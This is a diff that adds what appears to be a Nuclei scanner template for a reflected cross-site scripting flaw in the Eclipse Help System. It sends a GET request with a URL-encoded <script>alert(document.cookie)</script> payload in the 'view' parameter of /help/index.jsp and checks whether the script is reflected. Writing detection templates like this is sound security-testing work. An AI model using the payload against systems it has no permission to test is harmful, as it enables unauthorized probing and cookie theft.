@@ -1,0 +1,23 @@
+id: eclipse-help-system-xss
+info:
+  author: pikpikcu
+  name: Eclipse Help System RXSS vulnerability
+  severity: medium
+  tags: ibm,xss
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    type: word
+    words:
+    - <script>alert(document.cookie)</script>
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E'
